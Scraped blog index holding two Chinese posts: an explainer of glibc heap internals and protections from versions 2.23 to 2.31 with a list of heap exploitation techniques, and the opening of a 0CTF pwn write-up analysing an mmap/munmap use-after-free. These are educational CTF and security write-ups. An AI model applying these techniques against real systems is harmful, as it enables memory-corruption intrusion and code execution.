_int_malloc(size) { size_t nb=req2size(size) if(nb \u003c= get_max_fast()){ //如果请求的大小小于fastbin支持的最大大小 //那么从fast_bins中搜索，搜索到就返回 } if(in_small_bin_range(nb)) { //在fastbin中没有找到空闲的chunk或则请求大小大于fastbin支持的最大大小，就到这一步 //判断申请的大小是否在small_bin范围内 //如果在就从small_bin中搜索是否有复合的块，有就返回 } else { //请求的块在largin_bin的范围内 if(have_fastchunks(av)) malloc_consolidate(); //先判断fast_bins是否为空 //不为空，则触发malloc_consolidate，将fast_bins中的堆块合并 } foreeach(chunk:unsorted_bin) { //到这一步，如果请求大小在small_bin范围内，那么在fast_bins和small_bins中并未找到合适的，可能unsortedbins里面会有 //如果大小在large_bins范围内，那么可能发生了malloc_consolidate()，并将合并后的chunk放入unsortedbins，所以unsortedbins里面可能也会有合适的chunk //这一步就是遍历unsortedbins里面的chunk，看是否有合适的用于分配。 if(is_small\u0026\u0026only_chunk\u0026\u0026chunck_size\u003enb+MINISIZE) { //如果请求的大小在small_bins范围内，并且unsorted_bins中仅有一个堆块，这个堆块的大小大于请求大小加MINISIZE，则分配。 //MINISIZE在不同位数系统中不一样，MINISIZE就是malloc分配的最小堆块大小，这里之所以要保证大于nb+MINISIZE是因为当将这个chunk切割后，剩下的chunk也可以用于分配。 } if(size==nb) { //如果在unsortedbin中找到一个和请求大小一样的堆块，直接分配 } if(in_small_range(size)) { //在搜索unsortedbin的过程中，如果其大小在smallbin中，将其放入smallbin中进行管理 } else { //不在smallbin中，就必定在largebin中 //放入largebin中 } } //到这里，我们以及把unsortedbin中的堆块，重新分配到了smallbin和largebin中，这个时候smallbin或则largebin中可能会有符合我们请求的chunk if(!in_small_range(nb)) { //搜索largebin中，此时会按照small-first，best-fit的原则找一个合适的堆块，直接分配或则分割后分配 } for(bin in bins) { //到这一步，表面在属于自己大小的idx中找不到合适的堆块，将会尝试去从比自己大的idx中找到合适的堆块 } //到这里如果还没有分配成功那么就是是同Top chunk进行分配 use_top: if(size\u003e=nb+MINISIZE) { //Top chunk的大小大于请求大小加MINISIZE，则从TOP chunk中分配 } else if(heave_fastchunks(av)) { //如果Top chunk的大小不足够用于分配，则判断fastbin中是否有chunk有则执行malloc_consolidate malloc_consolidate(); //由于到了这里，fastchunks中还有堆块，则请求的堆必定是在smallbin范围内，否则在之前就以及情况fastbin了 //之后会返回外层循环，尝试重新分配 } else { //到这里如果还没有找到合适的堆块的话，那么久只有尝试申请新的堆块了。 brk() //注意这里要区分主/负分配区，只有主分配去是用brk分配内存。 } } 在上面的分析中我们对于2.23版本libc堆管理有了一个较为清晰的流程，更高版本的libc中，堆管理的流程相差不大，只是在里面加入了一些新的机制，后面我只写出其新增的流程和其位于流程中的位置。 下面我再简单的描述一下_int_free的逻辑，当然这里也只是抽取主要部分，细节部分需要大家自己去阅读源码了。 staci void _int_free(mstate av,mchunkptr p){ size_t size=chunksize(p); check_inuse_chunk(av,p); //检测所需要释放的堆块是否在使用 if(size\u003c=get_max_fast()) { if(next_chunk.size\u003c=2*SIZE_SZ||next_chunk.size\u003e=system_mem) { error(); //检查下一个堆块的大小是否正常 } if(old==p) { error(); //检查fastbin表头是否和当前块相同，相同则是double_free } //将堆块放入fastbin头部 } else if(!chunk_is_mapped(p)) { if(!prev_inuse(p)) { //如果上一块没有使用，则与其合并 p=prev_chunk(p); unlink(av,p,bck,fwd); } if(nextchunk != av.top) { if(!next_insue(p)) { //如果下一个堆块不是topchunk且未使用与其合并。 } } else{ //如果下一个堆块是topchunk，则与topchunk合并 av.top=p; } if(size\u003eFASTBIN_CONSOLIDATION_THRESHOLD) { //检查所需要释放的空间是否大于consolidate的阈值，如果大于则执行malloc_consolidate,并回收空间 malloc_consolidate(av); systrim(heap); } } else{ munmap_chunk(p) } } 高版本的释放逻辑基本2.23类似，只不过会添加更多的保护机制，在之后的分析中我仅会列出与2.23有变化的部分，相同的部分我就不进行阐述了。 我们的堆漏洞利用，通常都是由于程序堆中存在Dangling pointer或则overflow漏洞，再加上ptmalloc在一些地方保护不严谨，其保护机制可以被我们绕过甚至利用来达到任意地址写，进而getshell。比如利用fastbin分配时检测不充分，达到任意地址分配的目的。利用unlink解链达到写地址的操作。这里我也简单罗列一下在2.23版本下，可以使用的堆利用技巧。 ","date":"2020-05-19","objectID":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/:1:0","tags":null,"title":"不同版本glibc的堆管理和新增保护机制","uri":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"categories":["knowledge"],"content":"堆利用 house of spirit：构造一个fake_chunk并进行free，加入到fastbin中，下一次就可以分配我们的fake_chunk。 house_of_force：溢出到top_chunk，修改其size，令超大的分配可以从top_chunk中返回而不通过mmap痛过malloc（\u0026top-x）大小的分配返回任意地址。 house_of_lore：利用smallbin和largebin在头部插入尾部取出的特性，伪造bin中某个chunk的bk指针为fake_chunk并且fake_chunk的fd字段需要为该bin的地址。然后下一次分配就是我们的chunk。 house_of_orange：利用堆溢出和IO_list_all来获取shell。利用unsorted bin攻击修改io_list_all，然后将small bin中的0x61大小堆块看成FILE结构，修改相应的数据。不过unsorted bin和把0x61大小的chunk放入small bin是同时进行的。 house_of_einherijar：修改相邻chunk的size和pre_inuse位，使堆块合并进而出现堆块重叠。 house_of_roman：利用fast_bin和IO_FILE来达到泄漏libc的目的。 house_of_rabbit：利用malloc_consolidate的时候没有检查该bin是否符合该idx。如果修改size为一个更大的值将可以发生堆块重叠。 Unlink：伪造堆块，使堆块释放时，执行unlink，从而修改一些地址，但是为了绕过unlink的保护，修改的地址有限制。 堆重叠：修改size达到可以修改已经释放的chunk的目的进而可以进行更多的攻击 unsorted bin attack：利用unsortedbin的双向链表结构，篡改bk的值使任意地址储存一个较大的值。 large bin attack：利用malloc中将unsorted bin中的largin chunk放入large bin时没有做充足的检测进而可以修改任意地址为堆块的值。 2.23堆利用就介绍到这里，下面让我们来看一看2.27版本新增的机制和保护策略以及堆利用。 Glibc2.27 ","date":"2020-05-19","objectID":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/:2:0","tags":null,"title":"不同版本glibc的堆管理和新增保护机制","uri":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"categories":["knowledge"],"content":"tcache bin机制 2.27版本比2.23多了一个tchache bin。tchache bin是在2.26版本中引入的，用来进一步提升堆管理性能。 首先我们看一下tcache bin的几个宏定义（以下代码来至libc2.27，之后将不做说明） /* We want 64 entries. This is an arbitrary limit, which tunables can reduce. */ # define TCACHE_MAX_BINS 64 # define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1) /* Only used to pre-fill the tunables. */ # define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ) /* When \"x\" is from chunksize(). */ # define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT) /* When \"x\" is a user-provided size. */ # define usize2tidx(x) csize2tidx (request2size (x)) /* With rounding and alignment, the bins are... idx 0 bytes 0..24 (64-bit) or 0..12 (32-bit) idx 1 bytes 25..40 or 13..20 idx 2 bytes 41..56 or 21..28 etc. */ /* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */ # define TCACHE_FILL_COUNT 7 这里挑几个重点宏定义讲一下。TCACHE_MAX_BIN定义了用于管理tcache的最大bin数量，其被定义为64，及有64个bin用于管理tcache bin。其编号idx依次从0到63，对应的chunk size从MALLOC_ALIGNMENT*2到MALLOC_ALLIGNMENT*64，如果是64位系统，tcache bin中最大能储存0x800的大小。HACHE_FILL_COUNT定义了给个bin最多能粗存的个数。 再来看两个重要的tcache结构 /* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */ typedef struct tcache_entry { struct tcache_entry *next; } tcache_entry; /* There is one of these for each thread, which contains the per-thread cache (hence \"tcache_perthread_struct\"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */ typedef struct tcache_perthread_struct { char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; } tcache_perthread_struct; tchache_entry是一个单向列表，用来将bin中的chunk连成一个单链，其机制与fast bin类似。tcache_perthread_struct是用来管理bin的一个结构，其有一个char数组成员，用来记录给个bin已经储存了几个chunk，entries是每个不同大小bins的队头，用来遍历和管理tcache bin。tcache_perthread_struct在tcache_init()中创建，让我们一起来看一下这个函数。 static void tcache_init(void) { mstate ar_ptr; void *victim = 0; const size_t bytes = sizeof (tcache_perthread_struct); if (tcache_shutting_down) return; arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); if (!victim \u0026\u0026 ar_ptr != NULL) { ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); } if (ar_ptr != NULL) __libc_lock_unlock (ar_ptr-\u003emutex); /* In a low memory situation, we may not be able to allocate memory - in which case, we just keep trying later. However, we typically do this very early, so either there is sufficient memory, or there isn't enough memory to do non-trivial allocations anyway. */ if (victim) { tcache = (tcache_perthread_struct *) victim; memset (tcache, 0, sizeof (tcache_perthread_struct)); } } 其根据tchache_perthread_struct的大小，用malloc创建一个实例并将其赋值给全局遍历，tchache，而tchache就是tchache_perthread_struct的指针。并且tchache_init是在初始话时被调用，所以此时创建的chunk是堆块中第一个创建的chunk。（如果实现了任意地址修改，就可以修改此处的chunk，进而可以控制tcache bin的数量和指针） 接下来再介绍一下加入tcache和取出tcache的两个函数 /* Caller must ensure that we know tc_idx is valid and there's room for more chunks. */ static __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx) { tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx \u003c TCACHE_MAX_BINS); e-\u003enext = tcache-\u003eentries[tc_idx]; tcache-\u003eentries[tc_idx] = e; ++(tcache-\u003ecounts[tc_idx]); } /* Caller must ensure that we know tc_idx is valid and there's available chunks to remove. */ static __always_inline void * tcache_get (size_t tc_idx) { tcache_entry *e = tcache-\u003eentries[tc_idx]; assert (tc_idx \u003c TCACHE_MAX_BINS); assert (tcache-\u003eentries[tc_idx] \u003e 0); tcache-\u003eentries[tc_idx] = e-\u003enext; --(tcache-\u003ecounts[tc_idx]); return (void *) e; } tcache_put将tcache放入bin中，仅仅只是检查了其大小是否符合tcache。tcache_get从tcache中获得一个bin，也仅仅检测了大小是否符合tcache以及bin不为空。可以看出tcache安全机制特别简单，所以引入了tcache反而使漏洞利用更简单了。 下面我们看一看引入tcache后，malloc和free做了哪些改变。 ","date":"2020-05-19","objectID":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/:3:0","tags":null,"title":"不同版本glibc的堆管理和新增保护机制","uri":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"categories":["knowledge"],"content":"malloc和free的逻辑 首先看一下__libc_malloc，这里我们只写出该函数中我们关心的部分。 void * __libc_malloc (size_t bytes) { if (tc_idx \u003c mp_.tcache_bins /*\u0026\u0026 tc_idx \u003c TCACHE_MAX_BINS*/ /* to appease gcc */ \u0026\u0026 tcache \u0026\u0026 tcache-\u003eentries[tc_idx] != NULL) { return tcache_get (tc_idx); } victim = _int_malloc (ar_ptr, bytes); } 从函数代码中，我们可以看出，在执行int_malloc之前，程序首先去搜索tcache，查看tcache中是否有空闲的bin，如果有直接从tcache中分配，如果没有才执行int_malloc。 static void * _int_malloc (mstate av, size_t bytes) { size_t nb=req2size(bytes); if(nb\u003c=get_max_fast()) { //与2.23的区别在于，如果大小在fast_bin的范围内，那么如果尝试从fast_bin中获取堆块 //获取成功后，将fast_bin中剩余的堆块放入tcache中 } if(in_small_bin()) { //与2.23的区别在于，获取small_bin成功后，将剩下的堆块放入tcache中 } else{ malloc_consolidate(); } for(chunk::unsorted_bin) { ...... if(chunk_size==nb) { //将chunk放入tcache中,并将return_cached置为1 } ...... if(return_cached) { //如果return_cached为1，则从tcache中分配 } } ..... } 2.27的_int_malloc和2.23的主要区别在于2.27会将fastbin和smallbin还有unsortedbin中多余的块放入tcache中。 接下来让我们看一下free逻辑 static void _int_free (mstate av, mchunkptr p, int have_lock) { size_t size=chunksize(p); if(tcache) { //将该chunk放入tcache中 } ...... } 2.27的free与之前主要的区别在于先检查是否处于tcache范围，且tcache未存满，如果没有存满则直接put进去，之后的操作于2.23如出一辙。 ","date":"2020-05-19","objectID":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/:4:0","tags":null,"title":"不同版本glibc的堆管理和新增保护机制","uri":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"categories":["knowledge"],"content":"堆利用 tcache_dup：tcache的释放没有进行double free检测，如果存在UAF漏洞可直接对tcache进行double free 进而实现任意地址分配。 tcache_poisoning：类似于修改fast bin的fd字段。当程序存在溢出漏洞时，可以修改tcache的next字段，达到任意地址分配的目的。 tcache_house_of_spirit：类似于fast bin的house_of_spirit，但是tcache的检测比fastbin更为简单，只需要释放的chunk满足size要求即可，并不会对下一个chunk进行检测。 house_of_bot_cake：该方法的利用需要有UAF漏洞。释放7个chunk进而填满tcache，再释放两个相同的chunkA和B使其consolidate，再分配一个相同大小的chunk，让tcache有空余，再利用UAF再次释放chunkB，进而可以实现overlapping。 tcache_stashing_unlink_attack：利用分配small bin时会将多余的块放入tcache的机制，恶意修改bk的值，以达到修改某个地址为一个很大的值的目的。类似于unsorted bin attack。 fastbin_reverse_into_tcache：该利用方法和上一个利用方法原理类似，利用了分配fastbin时，会将多余的chunk放入tcache中。做法是先将tcache填满，再释放7个chunk，并修改fast表头的fd指针为我们想修改的地址。之后malloc8个chunk，在分配第8个chunk时，将会把fast bin中的chunk放入tcache中，从而修改目标地址。 Glibc2.29 libc2.29没有修改malloc和free的逻辑也没有新增像tcache一样的机制，只是修改了一些在malloc和free chunk时的检测机制，下面让我们一起来看一看2.29相较于之前的版本，检测机制做出了什么样的修改。 ","date":"2020-05-19","objectID":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/:5:0","tags":null,"title":"不同版本glibc的堆管理和新增保护机制","uri":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"categories":["knowledge"],"content":"tcache 我们知道2.27版本的tcache安全保护机制十分的脆弱，很容易就能被利用，所以在2.29版本中，对tcache结构体加入了新的字段 key。 typedef struct tcache_entry { struct tcache_entry *next; /* This field exists to detect double frees. */ struct tcache_perthread_struct *key; } tcache_entry; 加这个字段的目的主要是用来检测double free。 tcache_put (mchunkptr chunk, size_t tc_idx) { tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx \u003c TCACHE_MAX_BINS); /* Mark this chunk as \"in the tcache\" so the test in _int_free will detect a double free. */ e-\u003ekey = tcache; //new e-\u003enext = tcache-\u003eentries[tc_idx]; tcache-\u003eentries[tc_idx] = e; ++(tcache-\u003ecounts[tc_idx]); } tcache_get (size_t tc_idx) { tcache_entry *e = tcache-\u003eentries[tc_idx]; assert (tc_idx \u003c TCACHE_MAX_BINS); assert (tcache-\u003eentries[tc_idx] \u003e 0); tcache-\u003eentries[tc_idx] = e-\u003enext; --(tcache-\u003ecounts[tc_idx]); e-\u003ekey = NULL; //new return (void *) e; } 在加入tcache_bin时将key字段赋值为tcahce的地址，而在取出时，会将该字段清零。为什么这么做呢我们看一下int_free中新增的检测机制就清楚了。 ","date":"2020-05-19","objectID":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/:6:0","tags":null,"title":"不同版本glibc的堆管理和新增保护机制","uri":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"categories":["knowledge"],"content":"int_free新增检测机制 Int_free中新增了对tcache释放时，key字段的检验，下面是伪代码。 void * _int_free() { if(e-\u003ekey==tcache) { error(\"double free!\"); } } 如果当前释放的chunk，其key字段为tcache的话，那么判断其为double free ","date":"2020-05-19","objectID":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/:7:0","tags":null,"title":"不同版本glibc的堆管理和新增保护机制","uri":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"categories":["knowledge"],"content":"unlink 在free中除了新增了对tcache的检测，还增强了unlink的检测机制。 if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); if (__glibc_unlikely (chunksize(p) != prevsize)) //new malloc_printerr (\"corrupted size vs. prev_size while consolidating\"); unlink_chunk (av, p); } 在进行unlinlk解链前，会检查该chunk的大小是否和presize相同。增加了null of byte的利用难度。 ","date":"2020-05-19","objectID":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/:7:1","tags":null,"title":"不同版本glibc的堆管理和新增保护机制","uri":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"categories":["knowledge"],"content":"int_malloc新增检测机制 在2.29int_malloc中新增了关于unsorted bin的检测 if (__glibc_unlikely (size \u003c= 2 * SIZE_SZ) || __glibc_unlikely (size \u003e av-\u003esystem_mem)) malloc_printerr (\"malloc(): invalid size (unsorted)\"); if (__glibc_unlikely (chunksize_nomask (next) \u003c 2 * SIZE_SZ) || __glibc_unlikely (chunksize_nomask (next) \u003e av-\u003esystem_mem)) malloc_printerr (\"malloc(): invalid next size (unsorted)\"); if (__glibc_unlikely ((prev_size (next) \u0026 ~(SIZE_BITS)) != size)) malloc_printerr (\"malloc(): mismatching next-\u003eprev_size (unsorted)\"); if (__glibc_unlikely (bck-\u003efd != victim) || __glibc_unlikely (victim-\u003efd != unsorted_chunks (av))) malloc_printerr (\"malloc(): unsorted double linked list corrupted\"); if (__glibc_unlikely (prev_inuse (next))) malloc_printerr (\"malloc(): invalid next-\u003eprev_inuse (unsorted)\"); 检测了当前chunksize的合法性，nextchunksize的合法性以及双相链表的完整性。加入了这几个检测机制后，unsorted bin attack攻击将很难继续使用。 ","date":"2020-05-19","objectID":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/:8:0","tags":null,"title":"不同版本glibc的堆管理和新增保护机制","uri":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"categories":["knowledge"],"content":"use_top 在int_malloc中对use_top增加了检测机制。 if (__glibc_unlikely (size \u003e av-\u003esystem_mem))//0x21000 malloc_printerr (\"malloc(): corrupted top size\"); 在使用top chunk时对top chunk的大小进行了检验，使得house of force再也不能使用，从此载入史册。 ","date":"2020-05-19","objectID":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/:8:1","tags":null,"title":"不同版本glibc的堆管理和新增保护机制","uri":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"categories":["knowledge"],"content":"堆利用 2.29与2.27相比，unsorted_bin_attack，house of force，tcache_dump这三个漏洞利用技术，无法再使用。 Glibc2.30 2.30版本的libc与2.29没有太大的变化，但是对int_malloc中将unsorted bin中的内容放入large bin中时做了更多的检测，使得large bin attack再也无法使用，成为历史。 victim-\u003efwufad_nextsize = fwd; victim-\u003ebk_nextsize = fwd-\u003ebk_nextsize; if (__glibc_unlikely (fwd-\u003ebk_nextsize-\u003efd_nextsize != fwd)) malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\"); fwd-\u003ebk_nextsize = victim; victim-\u003ebk_nextsize-\u003efd_nextsize = victim; } bck = fwd-\u003ebk; if (bck-\u003efd != fwd) malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\"); 在将unsortd bin放入large bin时会检验fwd链表的完整性，使得largin attack通不过检测，攻击不成功。large bin从此退出利用舞台，载入历史。 Glibc2.31 libc2.31版本在堆块管理和安全机制上和2.30没有什么太大的变化。 参考 ptmalloc与glibc堆漏洞利用 how2heap glibc-2.29新增的保护机制学习总结 Heap Exploit v2.31 | 最新堆利用技巧，速速查收 ","date":"2020-05-19","objectID":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/:9:0","tags":null,"title":"不同版本glibc的堆管理和新增保护机制","uri":"/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"categories":["ctf"],"content":"一道做了许久的题目，涉及的知识挺多的。 涉及知识 PNG文件结构 线程互锁和消息 线程栈的分配 mmap和munmap 在开始分析程序之前，先对涉及的知识做一个简单的介绍，也算是对知识的总结。 ","date":"2020-05-13","objectID":"/0ctf-uploadcenter/:0:0","tags":["pwn","wp"],"title":"0CTF uploadcenter","uri":"/0ctf-uploadcenter/"},{"categories":["ctf"],"content":"PNG文件结构 PNG文件是由魔术和若干数据块构成的。 PNG的魔术为： 89 50 4E 47 0D 0A 1A 0A 数据块中最主要的数据块是IHDR，PLTE，IDAT，IEND。每个数据块又由一下四个部分构成，其中数据块类型码标记数块的类型，如IHDR数据块，这个字段就是‘IHDR’字符串，IDAT数据块，这个字段就是‘IDAT’字符串 名称 字节数 说明 Length (长度) 4字节 指定数据块中数据域的长度，其长度不超过(231－1)字节 Chunk Type Code (数据块类型码) 4字节 数据块类型码由ASCII字母(A-Z和a-z)组成 Chunk Data (数据块数据) 可变长度 存储按照Chunk Type Code指定的数据 CRC (循环冗余检测) 4字节 存储用来检测是否有错误的循环冗余码 IHDR是文件头数据块，主要包含了PNG图片的一些基本信息，如图像宽度，图像高度，图像深度等。 域的名称 字节数 说明 Width 4 bytes 图像宽度，以像素为单位 Height 4 bytes 图像高度，以像素为单位 Bit depth 1 byte 图像深度： 索引彩色图像：1，2，4或8 灰度图像：1，2，4，8或16 真彩色图像：8或16 Color Type 1 byte 颜色类型： 0：灰度图像, 1，2，4，8或16 2：真彩色图像，8或16 3：索引彩色图像，1，2，4或8 4：带α通道数据的灰度图像，8或16 6：带α通道数据的真彩色图像，8或16 Compression method 1 byte 压缩方法(LZ77派生算法) Filter method 1 byte 滤波器方法 Interlace method 1 byte 隔行扫描方法： 0：非隔行扫描 1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法) PLTE是调色板数据块包含有与索引彩色图像相关的彩色变换数据，它仅仅与索引的彩色图像有关，而且需要放在IDAT之前。 IDAT是图像数据块，用于储存实际的数据。 IEND是图像结束数据，用于标记PNG数据流的结尾，该段必须放在文件的尾部。通常这个数据段没有数据，所以一般这个段的内容是：00 00 00 00 49 45 4E 44 AE 42 60 82。前四个自己是数据段长度，因为没有数据，所以为0，中间四个字节是‘IEND’，最后四个字节是CRC结果。 ","date":"2020-05-13","objectID":"/0ctf-uploadcenter/:1:0","tags":["pwn","wp"],"title":"0CTF uploadcenter","uri":"/0ctf-uploadcenter/"},{"categories":["ctf"],"content":"线程互锁和消息 当两个线程同时访问一个全局变量时，如果不用互锁就会发送问题，比如A线程和B线程都对变量C进行加1操作，理论上来说C最后应该加2，但是如果A和B线程对C同时操作的话，C的最后结果是未知的。为了解决这样的问题，我们给线程加上了一个互锁机制，当A线程访问C时将会请求对mutex（Mutual exclusion）加锁，而当B访问C时，同样会有加锁请求，但是其以及被A加锁了，所以只能等待其解锁后再操作。这里需要用到的两个函数分别是：pthread_mutex_lock() pthread_mutex_unlock() 线程的消息机制是指当一个线程对一个队列等数据结构操作时，发现队列里面没有数据，于是解锁mutex并进入休眠，当队列里面有数据时，唤醒线程，并对mutex加锁。与这个操作有关的函数是：pthread_cond_wait（） pthread_cond_signal（） ","date":"2020-05-13","objectID":"/0ctf-uploadcenter/:2:0","tags":["pwn","wp"],"title":"0CTF uploadcenter","uri":"/0ctf-uploadcenter/"},{"categories":["ctf"],"content":"线程栈的分配 对于多线程的程序，每个线程都有自己独立的栈空间，栈空间的大小可以用ulimit -a来查询。为了防止栈溢出，在栈顶其还分配了一个0x1000大小的空间，该空间没有权限，所以如果栈的访问超过了栈空间大小，而访问了这个0x1000的空间，会发送段错误。 ","date":"2020-05-13","objectID":"/0ctf-uploadcenter/:3:0","tags":["pwn","wp"],"title":"0CTF uploadcenter","uri":"/0ctf-uploadcenter/"},{"categories":["ctf"],"content":"mmap和munmap mmap在分配时是向低字节生长的，这和heap分配的方式不同。并且mmap分配的空间当释放后会直接返回给操作系统，而不会像heap，会有bins管理机制。 程序分析 ","date":"2020-05-13","objectID":"/0ctf-uploadcenter/:4:0","tags":["pwn","wp"],"title":"0CTF uploadcenter","uri":"/0ctf-uploadcenter/"},{"categories":["ctf"],"content":"保护机制 没有开启PIE，开启部分RELRO ","date":"2020-05-13","objectID":"/0ctf-uploadcenter/:5:0","tags":["pwn","wp"],"title":"0CTF uploadcenter","uri":"/0ctf-uploadcenter/"},{"categories":["ctf"],"content":"漏洞分析 程序是一个上传gzip压缩的png图片，并用mmap的空间来储存。但是程序mmap的空间大小是由png图片IHDR数据块里面width和height数据来决定的，而munmap的大小是根据png数据块的大小来释放的。如果png数据块的大小大于width*height，那么将会多释放一些空间，如果这些空间有特殊用处的话，就存在UAF漏洞。 那么如何让图片后面的空间有用处呢？ 我们继续看程序的功能，程序有个monitor_file（），其将会开启一个线程来监视是否有新的文件上传。 根据上面的知识介绍，我们知道线程的栈也是用mmap来分配的，那么如果我们让图片的数据和stack的空间相邻，是否就可以将栈的数据给free掉，再之后重新上传图片以覆盖栈内数据呢？ 我们测试一下。这是没有开启monitor_file时内存的情况： 当我们调用monitor_file后：（由于不是一次调试的结果，所以可能地址不一样，但是主要是看大小的变化） 可以看到第二个箭头对应的大小从1e00000变成了1600000，增加的大小刚好是800000即8MB，刚好是该系统规定的线程栈大小。第一个箭头的0x1000就是用来保护栈的，防止栈溢出超过8MB。 我们再上传一个图片： 